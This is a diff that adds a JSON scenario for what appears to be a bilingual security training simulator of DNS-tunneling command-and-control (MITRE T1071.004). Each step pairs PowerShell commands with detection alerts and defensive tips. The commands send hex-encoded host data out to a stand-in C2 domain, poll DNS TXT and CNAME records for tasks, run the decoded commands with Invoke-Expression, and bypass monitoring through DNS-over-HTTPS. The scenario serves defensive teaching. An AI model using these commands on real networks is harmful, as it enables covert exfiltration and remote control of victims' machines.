@@ -1,0 +1,264 @@
+{
+  "id": "T1071.004",
+  "title": "DNS 터널링 C2 시뮬레이션",
+  "titleEn": "DNS Tunneling C2 Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon" },
+    { "label": "공격", "labelEn": "Attack" },
+    { "label": "침투", "labelEn": "Breach" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "target", "label": "Target PC", "type": "victim" },
+    { "id": "dns", "label": "DNS Server", "type": "server" },
+    { "id": "c2dns", "label": "C2 DNS (Authoritative)", "type": "server" },
+    { "id": "ndr", "label": "NDR / DNS Firewall", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "target", "to": "dns", "label": "DNS Query", "activeStep": 0 },
+    { "from": "dns", "to": "c2dns", "label": "Recursive Lookup", "activeStep": 0 },
+    { "from": "c2dns", "to": "target", "label": "TXT/CNAME Response", "activeStep": 2 },
+    { "from": "ndr", "to": "dns", "label": "DNS Monitor", "activeStep": 4 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "DNS Tunnel", "icon": "🕳️" },
+    { "label": "nslookup", "icon": "🔍" }
+  ],
+  "steps": [
+    {
+      "cmd": "nslookup -type=TXT init.a3f8c2d1.c2.{companyName}-cdn.com",
+      "out": "Server:  10.10.15.1\nAddress: 10.10.15.1#53\n\nNon-authoritative answer:\ninit.a3f8c2d1.c2.{companyName}-cdn.com  text = \"v=reg status=ok interval=5 session=7f3a8b2c\"",
+      "def": "[NDR] Suspicious DNS TXT query to recently registered subdomain",
+      "defAction": "Source: 10.10.15.22 (WS-PC0142)\nDNS Server: 10.10.15.1\nQuery: init.a3f8c2d1.c2.{companyName}-cdn.com (TXT)\nDomain Age: 3 days\nResponse: Registration command\nRisk: HIGH",
+      "desc": "DNS TXT 레코드 쿼리를 통해 C2 서버에 초기 등록을 수행합니다. 합법적 CDN 도메인으로 위장합니다.",
+      "descEn": "Performs initial C2 registration via DNS TXT record query. The domain is disguised as a legitimate CDN.",
+      "stepTitle": "DNS C2 등록",
+      "stepTitleEn": "DNS C2 Registration",
+      "feynman": "전화번호부에 가짜 전화번호를 등록해두고, 특정 번호를 조회하면 비밀 메시지를 받는 것과 같습니다. 누구나 전화번호부(DNS)를 조회할 수 있기 때문에 의심을 받기 어렵습니다.",
+      "feynmanEn": "It's like registering a fake phone number in the directory. When someone looks up that specific number, they receive a secret message. Since anyone can look up the directory (DNS), it's hard to raise suspicion.",
+      "expert": "DNS TXT 레코드는 원래 SPF, DKIM 등 메일 인증에 사용되지만, C2 데이터 전송에 악용됩니다. DNS 쿼리는 대부분의 방화벽에서 허용되므로 covert channel로 자주 사용됩니다. 도메인 등록일 3일은 명확한 의심 지표입니다.",
+      "expertEn": "DNS TXT records are originally used for mail authentication (SPF, DKIM) but are abused for C2 data transfer. DNS queries are allowed through most firewalls, making them common covert channels. A 3-day-old domain is a clear suspicious indicator.",
+      "defTooltip": "DNS 방화벽에서 등록일 30일 미만 도메인에 대한 TXT 쿼리를 모니터링하세요. 특히 서브도메인에 hex 문자열이나 비정상적으로 긴 레이블이 포함된 경우 의심하세요.",
+      "defTooltipEn": "Monitor DNS TXT queries to domains registered within 30 days in your DNS firewall. Especially suspicious when subdomain labels contain hex strings or are abnormally long.",
+      "hackerLog": {
+        "title": "DNS C2 초기 등록",
+        "lines": [
+          { "text": "nslookup -type=TXT init.a3f8c2d1.c2.{companyName}-cdn.com", "desc": "DNS TXT 레코드로 C2 초기 등록" },
+          { "text": "text = \"v=reg status=ok interval=5 session=7f3a8b2c\"", "desc": "C2 등록 성공, 5초 간격 폴링 설정" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS TXT Record", "desc": "DNS의 텍스트 레코드 - 임의 문자열 저장 가능, C2 데이터 전송에 악용" },
+        { "term": "Covert Channel", "desc": "정상 통신 채널을 이용하여 은밀하게 데이터를 주고받는 비밀 통로" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$session = '7f3a8b2c';\n$domain = 'c2.{companyName}-cdn.com';\nfunction Encode-DNS($data) {\n  $hex = [BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes($data)) -replace '-','';\n  $chunks = $hex -split '(.{63})' | Where-Object { $_ };\n  return ($chunks -join '.') + \".$session.$domain\"\n}\n$sysinfo = \\\"$(hostname)|{userName}|{companyName}|Win11|AMD64\\\";\n$query = Encode-DNS $sysinfo;\nWrite-Host \\\"DNS query: $($query.Substring(0,60))...$domain\\\";\nnslookup -type=A $query 2>&1 | Select-Object -Last 3\"",
+      "out": "DNS query: 57532D50433031343227...c2.{companyName}-cdn.com\n\nName:    57532D504330313432.7C6A7061726B.7C.7f3a8b2c.c2.{companyName}-cdn.com\nAddress: 10.0.0.1",
+      "def": "[NDR] DNS tunneling detected - hex-encoded data in subdomain labels",
+      "defAction": "Source: 10.10.15.22\nQuery Type: A record\nSubdomain Labels: Hex-encoded system information\nLabel Length: Near 63-char limit\nSession: 7f3a8b2c\nRisk: CRITICAL\nAction: DNS query blocked",
+      "desc": "시스템 정보를 16진수로 인코딩하여 DNS 서브도메인 레이블에 삽입합니다. 일반 DNS 트래픽처럼 보입니다.",
+      "descEn": "Hex-encodes system information into DNS subdomain labels. Appears as normal DNS traffic.",
+      "stepTitle": "Hex 서브도메인 인코딩",
+      "stepTitleEn": "Hex Subdomain Encoding",
+      "feynman": "편지 봉투의 보내는 사람 주소란에 비밀 메시지를 적는 것과 같습니다. 우체국은 주소만 보고 배달하지만, 실제로는 주소 자체에 정보가 숨겨져 있습니다.",
+      "feynmanEn": "It's like writing a secret message in the return address field of a letter. The post office delivers based on the address, but the address itself contains hidden information.",
+      "expert": "DNS 레이블은 최대 63자로 제한됩니다. 공격자는 데이터를 63자 청크로 분할하여 서브도메인 레이블에 삽입합니다. Hex 인코딩(2바이트/문자)은 효율이 낮지만 DNS 문자셋 제한을 우회합니다. 비정상적으로 긴 서브도메인 레이블은 핵심 탐지 지표입니다.",
+      "expertEn": "DNS labels are limited to 63 characters. Attackers split data into 63-char chunks inserted as subdomain labels. Hex encoding (2 bytes/char) has low efficiency but bypasses DNS charset restrictions. Abnormally long subdomain labels are a key detection indicator.",
+      "defTooltip": "DNS 로그에서 서브도메인 레이블 길이가 30자 이상인 쿼리를 탐지하세요. 정상 DNS 쿼리는 대부분 짧은 레이블을 사용합니다.",
+      "defTooltipEn": "Detect DNS queries with subdomain label lengths exceeding 30 characters. Normal DNS queries mostly use short labels.",
+      "hackerLog": {
+        "title": "DNS 서브도메인 데이터 인코딩",
+        "lines": [
+          { "text": "57532D504330313432.7C6A7061726B.7C...", "desc": "시스템 정보가 hex로 서브도메인에 삽입됨" },
+          { "text": "Label Length: Near 63-char limit", "desc": "DNS 레이블 최대 길이 근접 사용" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS Label", "desc": "도메인 이름의 각 점(.)으로 구분된 부분 - 최대 63자 제한" },
+        { "term": "Hex Encoding", "desc": "데이터를 16진수 문자열로 변환하는 인코딩 방식" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\nfor($i=0; $i -lt 5; $i++) {\n  Start-Sleep -Seconds 5;\n  $resp = Resolve-DnsName -Name \\\"poll.$i.7f3a8b2c.c2.{companyName}-cdn.com\\\" -Type TXT -ErrorAction SilentlyContinue;\n  $txt = $resp.Strings -join '';\n  if($txt -eq 'NOOP') {\n    Write-Host \\\"[$(Get-Date -Format 'HH:mm:ss')] Poll $i : no task\\\";\n  } else {\n    Write-Host \\\"[$(Get-Date -Format 'HH:mm:ss')] Poll $i : TASK RECEIVED\\\";\n    Write-Host \\\"  Encoded: $txt\\\";\n    break;\n  }\n}\"",
+      "out": "[10:05:12] Poll 0 : no task\n[10:05:17] Poll 1 : no task\n[10:05:22] Poll 2 : no task\n[10:05:27] Poll 3 : TASK RECEIVED\n  Encoded: 6970636F6E666967202F616C6C",
+      "def": "[NDR] Periodic DNS TXT polling - C2 command channel detected",
+      "defAction": "Source: 10.10.15.22\nPattern: DNS TXT queries every 5s\nDomain: poll.*.7f3a8b2c.c2.{companyName}-cdn.com\nQueries: 4 (3 NOOP, 1 command)\nRisk: HIGH",
+      "desc": "5초 간격으로 DNS TXT 레코드를 조회하여 C2 명령을 수신합니다. 4번째 조회에서 인코딩된 명령을 받습니다.",
+      "descEn": "Polls DNS TXT records every 5 seconds to receive C2 commands. Receives an encoded command on the 4th query.",
+      "stepTitle": "DNS 폴링 수신",
+      "stepTitleEn": "DNS TXT Polling",
+      "feynman": "매 5초마다 비밀 사서함을 확인하러 가는 것과 같습니다. 3번은 빈 사서함이었지만, 4번째에 암호화된 지시서가 들어있습니다.",
+      "feynmanEn": "It's like checking a secret mailbox every 5 seconds. The mailbox was empty 3 times, but on the 4th check, there's an encrypted instruction sheet.",
+      "expert": "DNS TXT 폴링은 C2 명령 채널의 핵심입니다. NOOP 응답은 대기 상태, hex 인코딩된 응답은 실행 명령입니다. 5초 간격의 DNS 쿼리는 비정상적으로 높은 빈도이며, DNS 쿼리 빈도 분석(Query Rate Analysis)으로 탐지할 수 있습니다.",
+      "expertEn": "DNS TXT polling is the core of the C2 command channel. NOOP responses mean standby, hex-encoded responses are execution commands. 5-second DNS query intervals are abnormally high frequency, detectable via DNS Query Rate Analysis.",
+      "defTooltip": "동일 도메인에 대한 DNS 쿼리 빈도가 분당 10회 이상이면 DNS 터널링을 의심하세요. passive DNS 로그에서 쿼리 패턴을 분석하세요.",
+      "defTooltipEn": "Suspect DNS tunneling when DNS query frequency to the same domain exceeds 10 per minute. Analyze query patterns in passive DNS logs.",
+      "hackerLog": {
+        "title": "DNS C2 폴링",
+        "lines": [
+          { "text": "[10:05:27] Poll 3 : TASK RECEIVED", "desc": "4번째 폴링에서 C2 명령 수신" },
+          { "text": "Encoded: 6970636F6E666967202F616C6C", "desc": "hex 인코딩된 명령 페이로드" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS Polling", "desc": "주기적으로 DNS 쿼리를 전송하여 새 명령을 확인하는 C2 통신 방식" },
+        { "term": "NOOP (No Operation)", "desc": "새 작업이 없음을 나타내는 대기 응답" },
+        { "term": "Passive DNS", "desc": "DNS 쿼리/응답을 수동적으로 기록하여 분석하는 보안 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$encoded = '6970636F6E666967202F616C6C';\n$bytes = [byte[]]@(for($i=0;$i -lt $encoded.Length;$i+=2){[Convert]::ToByte($encoded.Substring($i,2),16)});\n$command = [Text.Encoding]::UTF8.GetString($bytes);\nWrite-Host \\\"Decoded command: $command\\\";\nWrite-Host '---Executing---';\nInvoke-Expression $command\"",
+      "out": "Decoded command: ipconfig /all\n---Executing---\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : WS-PC0142\n   Primary Dns Suffix  . . . . . . . : {companyName}.local\n   DNS Servers . . . . . . . . . . . : 10.10.15.1\n                                       10.10.15.2\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 10.10.15.22\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.10.15.1",
+      "def": "[EDR] DNS-received command decoded and executed",
+      "defAction": "Process: powershell.exe (PID: 7100)\nAction: Hex decode → Invoke-Expression\nCommand: ipconfig /all\nC2 Channel: DNS TXT\nRisk: CRITICAL",
+      "desc": "수신된 16진수 인코딩 명령을 디코딩하고 실행합니다. ipconfig /all로 네트워크 구성을 수집합니다.",
+      "descEn": "Decodes and executes the received hex-encoded command. Collects network configuration with ipconfig /all.",
+      "stepTitle": "명령 디코딩/실행",
+      "stepTitleEn": "Decode & Execute",
+      "feynman": "비밀 편지에 적힌 암호를 해독해서 지시대로 행동하는 것과 같습니다. '건물의 모든 출입구와 통로를 조사하라(ipconfig /all)'는 지시를 실행합니다.",
+      "feynmanEn": "It's like decoding a cipher from a secret letter and following the instructions. Executes the order 'Survey all entrances and corridors in the building (ipconfig /all).'",
+      "expert": "Invoke-Expression은 문자열을 PowerShell 명령으로 실행하는 위험한 cmdlet입니다. hex → UTF-8 디코딩 후 IEX 실행 체인은 전형적인 C2 에이전트 패턴입니다. PowerShell 스크립트 블록 로깅(Event ID 4104)으로 실행된 명령 내용을 캡처할 수 있습니다.",
+      "expertEn": "Invoke-Expression is a dangerous cmdlet that executes strings as PowerShell commands. The hex → UTF-8 decode → IEX chain is a classic C2 agent pattern. PowerShell Script Block Logging (Event ID 4104) can capture executed command contents.",
+      "defTooltip": "PowerShell Script Block Logging(Event ID 4104)에서 Invoke-Expression(IEX) 호출과 hex 디코딩 패턴을 탐지하세요. AMSI(Anti-Malware Scan Interface)도 활성화하세요.",
+      "defTooltipEn": "Detect Invoke-Expression (IEX) calls with hex decoding patterns in PowerShell Script Block Logging (Event ID 4104). Also enable AMSI (Anti-Malware Scan Interface).",
+      "hackerLog": {
+        "title": "C2 명령 실행",
+        "lines": [
+          { "text": "Decoded command: ipconfig /all", "desc": "hex 디코딩으로 원본 명령 복원" },
+          { "text": "IPv4 Address: 10.10.15.22", "desc": "네트워크 구성 정보 수집 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Invoke-Expression (IEX)", "desc": "문자열을 PowerShell 명령으로 실행하는 cmdlet - C2에서 자주 악용" },
+        { "term": "AMSI", "desc": "Anti-Malware Scan Interface - PowerShell 스크립트를 실시간으로 검사하는 보안 인터페이스" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$output = ipconfig /all | Out-String;\n$hex = [BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes($output)) -replace '-','';\n# Split into 63-char DNS labels, max 253 chars per FQDN\n$chunkSize = 120; # chars per query (2 labels)\n$chunks = [math]::Ceiling($hex.Length / $chunkSize);\nWrite-Host \\\"Output size: $($output.Length) chars\\\";\nWrite-Host \\\"Hex encoded: $($hex.Length) chars\\\";\nWrite-Host \\\"DNS queries needed: $chunks\\\";\nfor($i=0; $i -lt [math]::Min($chunks,5); $i++) {\n  $part = $hex.Substring($i*$chunkSize, [math]::Min($chunkSize, $hex.Length-$i*$chunkSize));\n  $query = \\\"r.$i.$chunks.7f3a8b2c.$($part.Substring(0,30))...c2.{companyName}-cdn.com\\\";\n  Write-Host \\\"  Query $i`: $query\\\";\n};\nif($chunks -gt 5) { Write-Host \\\"  ... ($($chunks-5) more queries)\\\" }\"",
+      "out": "Output size: 892 chars\nHex encoded: 1784 chars\nDNS queries needed: 15\n  Query 0: r.0.15.7f3a8b2c.57696E646F7773204950...c2.{companyName}-cdn.com\n  Query 1: r.1.15.7f3a8b2c.446E73205365727665727...c2.{companyName}-cdn.com\n  Query 2: r.2.15.7f3a8b2c.2E202E202E202E202E20...c2.{companyName}-cdn.com\n  Query 3: r.3.15.7f3a8b2c.31302E31302E31352E32...c2.{companyName}-cdn.com\n  Query 4: r.4.15.7f3a8b2c.3235352E3235352E3235...c2.{companyName}-cdn.com\n  ... (10 more queries)",
+      "def": "[NDR] High-volume DNS exfiltration - data chunked across 15 queries",
+      "defAction": "Source: 10.10.15.22\nDomain: c2.{companyName}-cdn.com\nExfiltration: 15 DNS A queries\nData Size: 1784 bytes (hex)\nContent: ipconfig output\nRisk: CRITICAL\nAction: DNS sink-holing initiated",
+      "desc": "명령 실행 결과를 15개의 DNS 쿼리로 분할하여 C2 서버로 전송합니다. 각 쿼리가 120자의 데이터를 운반합니다.",
+      "descEn": "Splits command output into 15 DNS queries for exfiltration to C2. Each query carries 120 characters of data.",
+      "stepTitle": "DNS 청크 유출",
+      "stepTitleEn": "Chunked DNS Exfil",
+      "feynman": "긴 편지를 15장의 엽서로 나눠서 보내는 것과 같습니다. 각 엽서에는 편지의 일부분만 적혀있고, 받는 사람이 순서대로 이어붙이면 원본 편지가 완성됩니다.",
+      "feynmanEn": "It's like splitting a long letter into 15 postcards. Each postcard contains only a portion, and the recipient assembles them in order to reconstruct the original letter.",
+      "expert": "892바이트의 ipconfig 출력이 hex 인코딩 후 1784바이트로 팽창하고, DNS 레이블 제한(63자)으로 인해 15개 쿼리로 분할됩니다. DNS 터널링의 낮은 대역폭(~7 bytes/sec)은 대용량 데이터 유출에 비효율적이지만, 탐지 회피가 우선입니다.",
+      "expertEn": "892 bytes of ipconfig output expands to 1784 bytes after hex encoding, split into 15 queries due to DNS label limits (63 chars). DNS tunneling's low bandwidth (~7 bytes/sec) is inefficient for large data exfil, but detection evasion is the priority.",
+      "defTooltip": "동일 도메인에 대한 연속적인 DNS A 쿼리가 짧은 시간 내에 다수 발생하면 데이터 유출 시도입니다. DNS 쿼리의 서브도메인 엔트로피(Shannon entropy)를 측정하세요.",
+      "defTooltipEn": "Multiple consecutive DNS A queries to the same domain in a short time indicate data exfiltration. Measure subdomain Shannon entropy of DNS queries.",
+      "hackerLog": {
+        "title": "DNS 기반 데이터 유출",
+        "lines": [
+          { "text": "DNS queries needed: 15", "desc": "892바이트 데이터를 15개 DNS 쿼리로 분할" },
+          { "text": "r.0.15.7f3a8b2c.57696E646F777320...", "desc": "각 쿼리에 120자 hex 데이터 삽입" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS Exfiltration", "desc": "DNS 쿼리의 서브도메인을 이용하여 데이터를 외부로 유출하는 기법" },
+        { "term": "Shannon Entropy", "desc": "데이터의 무작위성을 측정하는 수학적 지표 - DNS 터널링 탐지에 활용" },
+        { "term": "DNS Sinkholing", "desc": "악성 도메인의 DNS 응답을 차단하거나 안전한 IP로 리다이렉트하는 방어 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# CNAME record based C2 - more stealthy\n$resp = Resolve-DnsName -Name 'task.7f3a8b2c.c2.{companyName}-cdn.com' -Type CNAME;\nWrite-Host \\\"CNAME response: $($resp.NameHost)\\\";\n# Decode CNAME: hex-encoded command in subdomain\n$parts = $resp.NameHost.Split('.');\n$hexData = $parts[0..($parts.Length-4)] -join '';\n$bytes = [byte[]]@(for($i=0;$i -lt $hexData.Length;$i+=2){[Convert]::ToByte($hexData.Substring($i,2),16)});\n$cmd = [Text.Encoding]::UTF8.GetString($bytes);\nWrite-Host \\\"Decoded CNAME command: $cmd\\\"\"",
+      "out": "CNAME response: 6E65742075736572202F646F6D61696E.c2.{companyName}-cdn.com\nDecoded CNAME command: net user /domain",
+      "def": "[NDR] C2 command received via DNS CNAME record",
+      "defAction": "Source: 10.10.15.22\nQuery: task.7f3a8b2c.c2.{companyName}-cdn.com (CNAME)\nResponse: Hex-encoded command in CNAME target\nDecoded: net user /domain\nRisk: CRITICAL",
+      "desc": "DNS CNAME 레코드를 통해 C2 명령을 수신합니다. TXT 레코드보다 탐지가 어려운 대안 채널입니다.",
+      "descEn": "Receives C2 commands via DNS CNAME records. An alternative channel harder to detect than TXT records.",
+      "stepTitle": "CNAME 명령 채널",
+      "stepTitleEn": "CNAME Command Channel",
+      "feynman": "이번에는 전화번호부의 '별명(CNAME)' 항목에 비밀 메시지를 숨깁니다. 전화번호(TXT)가 감시당하면, 별명(CNAME) 항목으로 채널을 바꿉니다.",
+      "feynmanEn": "This time, the secret message is hidden in the 'alias (CNAME)' entry of the phone directory. If the phone number (TXT) is being monitored, they switch to the alias (CNAME) channel.",
+      "expert": "CNAME 레코드를 C2 채널로 사용하면 TXT 레코드 기반 탐지 규칙을 우회할 수 있습니다. 보안 도구가 TXT 쿼리만 모니터링하는 경우가 많기 때문입니다. A, TXT, CNAME, MX 등 다양한 레코드 타입을 번갈아 사용하는 것은 고급 DNS 터널링 기법입니다.",
+      "expertEn": "Using CNAME records as C2 channels bypasses TXT record-based detection rules. Many security tools only monitor TXT queries. Alternating between A, TXT, CNAME, MX record types is an advanced DNS tunneling technique.",
+      "defTooltip": "DNS 모니터링을 TXT 레코드뿐만 아니라 CNAME, MX, NULL 등 모든 레코드 타입에 대해 확장하세요. 비정상적인 CNAME 응답 패턴을 탐지하세요.",
+      "defTooltipEn": "Extend DNS monitoring beyond TXT records to all record types including CNAME, MX, and NULL. Detect abnormal CNAME response patterns.",
+      "hackerLog": {
+        "title": "CNAME 기반 명령 수신",
+        "lines": [
+          { "text": "CNAME: 6E65742075736572202F646F6D61696E.c2...", "desc": "CNAME 레코드에 hex 인코딩된 명령 삽입" },
+          { "text": "Decoded CNAME command: net user /domain", "desc": "도메인 사용자 열거 명령 수신" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS CNAME Record", "desc": "Canonical Name - 도메인의 별칭을 지정하는 DNS 레코드 타입" },
+        { "term": "Channel Switching", "desc": "탐지 회피를 위해 다양한 통신 채널을 번갈아 사용하는 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# DNS-over-HTTPS (DoH) to bypass corporate DNS monitoring\n$dohUrl = 'https://dns.google/resolve';\n$resp = Invoke-RestMethod -Uri \\\"$dohUrl`?name=poll.10.7f3a8b2c.c2.{companyName}-cdn.com&type=TXT\\\";\nWrite-Host \\\"DoH Response Status: $($resp.Status)\\\";\nWrite-Host \\\"Answer: $($resp.Answer.data)\\\";\nWrite-Host '';\nWrite-Host 'DNS-over-HTTPS bypasses:';\nWrite-Host '  - Corporate DNS server logging';\nWrite-Host '  - DNS-layer firewalls';\nWrite-Host '  - Split-horizon DNS controls'\"",
+      "out": "DoH Response Status: 0\nAnswer: 6E6574207374617420616E\n\nDNS-over-HTTPS bypasses:\n  - Corporate DNS server logging\n  - DNS-layer firewalls\n  - Split-horizon DNS controls",
+      "def": "[Proxy] DNS-over-HTTPS detected - bypass of DNS monitoring",
+      "defAction": "Source: 10.10.15.22\nDestination: dns.google (8.8.8.8)\nProtocol: HTTPS (DoH)\nQuery: c2.{companyName}-cdn.com TXT\nBypass: Corporate DNS logging\nRisk: CRITICAL\nAction: DoH endpoints blocked at proxy",
+      "desc": "DNS-over-HTTPS(DoH)를 사용하여 기업 DNS 모니터링을 우회합니다. 암호화된 HTTPS 내에서 DNS 쿼리가 전송됩니다.",
+      "descEn": "Uses DNS-over-HTTPS (DoH) to bypass corporate DNS monitoring. DNS queries are sent within encrypted HTTPS.",
+      "stepTitle": "DoH 모니터링 우회",
+      "stepTitleEn": "DoH Bypass",
+      "feynman": "감시자가 우편함을 지켜보고 있어서, 이번에는 택배회사(Google DNS)를 통해 비밀 편지를 보냅니다. 택배 포장(HTTPS)이 되어있어서 내용물을 볼 수 없습니다.",
+      "feynmanEn": "Since someone is watching the mailbox, this time the spy sends the secret letter through a courier service (Google DNS). The courier packaging (HTTPS) prevents anyone from seeing the contents.",
+      "expert": "DNS-over-HTTPS(DoH)는 DNS 쿼리를 HTTPS 내에 캡슐화하여 기업 DNS 서버와 DNS 방화벽을 완전히 우회합니다. dns.google(8.8.8.8), cloudflare-dns.com(1.1.1.1) 등의 공개 DoH 엔드포인트를 차단해야 합니다.",
+      "expertEn": "DNS-over-HTTPS (DoH) encapsulates DNS queries within HTTPS, completely bypassing corporate DNS servers and DNS firewalls. Public DoH endpoints like dns.google (8.8.8.8) and cloudflare-dns.com (1.1.1.1) must be blocked.",
+      "defTooltip": "프록시에서 dns.google, cloudflare-dns.com 등 공개 DoH 엔드포인트를 차단하세요. 네트워크에서 포트 853(DoT)과 공개 DNS IP로의 트래픽도 차단하세요.",
+      "defTooltipEn": "Block public DoH endpoints like dns.google, cloudflare-dns.com at the proxy. Also block port 853 (DoT) and traffic to public DNS IPs at the network level.",
+      "hackerLog": {
+        "title": "DNS-over-HTTPS 우회",
+        "lines": [
+          { "text": "https://dns.google/resolve?name=poll.10.7f3a8b2c...", "desc": "Google DoH를 통한 DNS 모니터링 우회" },
+          { "text": "Bypasses: Corporate DNS server logging, DNS-layer firewalls", "desc": "기업 DNS 로깅과 방화벽 완전 우회" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS-over-HTTPS (DoH)", "desc": "DNS 쿼리를 HTTPS로 암호화하여 전송하는 프로토콜 (RFC 8484)" },
+        { "term": "DNS-over-TLS (DoT)", "desc": "DNS 쿼리를 TLS로 암호화하여 포트 853으로 전송하는 프로토콜" },
+        { "term": "Split-horizon DNS", "desc": "내부/외부 네트워크에 다른 DNS 응답을 제공하는 구성" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\nWrite-Host '=== DNS Tunneling Session Summary ===';\nWrite-Host '';\nWrite-Host 'Session ID   : 7f3a8b2c';\nWrite-Host 'Duration     : 12 minutes';\nWrite-Host 'DNS Queries  : 47 total';\nWrite-Host '  - A records  : 22 (data exfiltration)';\nWrite-Host '  - TXT records: 15 (command polling)';\nWrite-Host '  - CNAME      : 5 (command channel)';\nWrite-Host '  - DoH        : 5 (monitoring bypass)';\nWrite-Host 'Data Sent    : 4.2 KB (via subdomain encoding)';\nWrite-Host 'Data Received: 1.1 KB (via TXT/CNAME responses)';\nWrite-Host 'Commands Exec: 3';\nWrite-Host 'Avg Bandwidth: ~7 bytes/second';\nWrite-Host '';\nWrite-Host '[!] DNS tunneling is slow but extremely difficult to detect';\nWrite-Host '[!] without specialized DNS analytics tools'\"",
+      "out": "=== DNS Tunneling Session Summary ===\n\nSession ID   : 7f3a8b2c\nDuration     : 12 minutes\nDNS Queries  : 47 total\n  - A records  : 22 (data exfiltration)\n  - TXT records: 15 (command polling)\n  - CNAME      : 5 (command channel)\n  - DoH        : 5 (monitoring bypass)\nData Sent    : 4.2 KB (via subdomain encoding)\nData Received: 1.1 KB (via TXT/CNAME responses)\nCommands Exec: 3\nAvg Bandwidth: ~7 bytes/second\n\n[!] DNS tunneling is slow but extremely difficult to detect\n[!] without specialized DNS analytics tools",
+      "def": "[SIEM] DNS tunneling session analysis - comprehensive summary",
+      "defAction": "Session: 7f3a8b2c (12 minutes)\nTotal DNS Queries: 47 (anomalous volume)\nDomain: c2.{companyName}-cdn.com\nData Transferred: 5.3 KB total\nRecord Types: A, TXT, CNAME, DoH\nRisk: CRITICAL\nAction: Domain blocked, host quarantined",
+      "desc": "DNS 터널링 세션을 요약합니다. 47개의 DNS 쿼리로 5.3KB의 데이터를 교환했으며, 평균 7바이트/초의 대역폭입니다.",
+      "descEn": "Summarizes the DNS tunneling session. 47 DNS queries exchanged 5.3KB of data at an average bandwidth of 7 bytes/second.",
+      "stepTitle": "세션 요약",
+      "stepTitleEn": "Session Summary",
+      "feynman": "12분 동안 47통의 편지를 주고받아서 총 5.3KB의 정보를 교환한 셈입니다. 속도는 매우 느리지만(초당 7바이트), 일반 우편(DNS)처럼 보이기 때문에 특수 분석 장비 없이는 발견하기 극히 어렵습니다.",
+      "feynmanEn": "In 12 minutes, 47 letters were exchanged totaling 5.3KB of data. The speed is very slow (7 bytes/second), but because it looks like regular mail (DNS), it's extremely hard to discover without specialized analysis tools.",
+      "expert": "DNS 터널링의 핵심 특성: 낮은 대역폭(~7 B/s), 높은 은닉성, 대부분의 방화벽 통과. 전문 DNS 분석 도구(Cisco Umbrella, Infoblox, 자체 ML 기반)로만 효과적으로 탐지 가능합니다. iodine, dnscat2, dns2tcp가 대표적인 오픈소스 DNS 터널링 도구입니다.",
+      "expertEn": "Key DNS tunneling characteristics: low bandwidth (~7 B/s), high stealth, passes most firewalls. Only specialized DNS analytics tools (Cisco Umbrella, Infoblox, custom ML) can effectively detect it. iodine, dnscat2, dns2tcp are major open-source DNS tunneling tools.",
+      "defTooltip": "전문 DNS 분석 솔루션(Cisco Umbrella, Infoblox 등)을 도입하여 DNS 쿼리의 엔트로피, 빈도, 레이블 길이 등을 종합 분석하세요. ML 기반 이상 탐지가 가장 효과적입니다.",
+      "defTooltipEn": "Deploy specialized DNS analytics solutions (Cisco Umbrella, Infoblox) to comprehensively analyze DNS query entropy, frequency, and label lengths. ML-based anomaly detection is most effective.",
+      "hackerLog": {
+        "title": "DNS 터널링 세션 요약",
+        "lines": [
+          { "text": "DNS Queries: 47 total (A:22, TXT:15, CNAME:5, DoH:5)", "desc": "47개 DNS 쿼리로 다중 레코드 타입 활용" },
+          { "text": "Avg Bandwidth: ~7 bytes/second", "desc": "느리지만 탐지 극히 어려운 은밀 채널" }
+        ]
+      },
+      "terms": [
+        { "term": "DNS Tunneling", "desc": "DNS 프로토콜을 통해 데이터를 은밀하게 전송하는 공격 기법" },
+        { "term": "iodine / dnscat2", "desc": "대표적인 DNS 터널링 오픈소스 도구" },
+        { "term": "DNS Analytics", "desc": "DNS 트래픽을 통계적/ML로 분석하여 이상 패턴을 탐지하는 보안 기법" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "nslookup.exe (init registration)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "powershell.exe (PID: 7100)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "Resolve-DnsName (hex subdomain)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "DNS TXT Poll (5s interval)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "Invoke-Expression (decoded cmd)", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "ipconfig.exe /all", "depth": 4, "alert": false, "minStep": 3 },
+    { "name": "DNS A queries (15x exfil chunks)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "CNAME command channel", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "Invoke-RestMethod (DoH bypass)", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
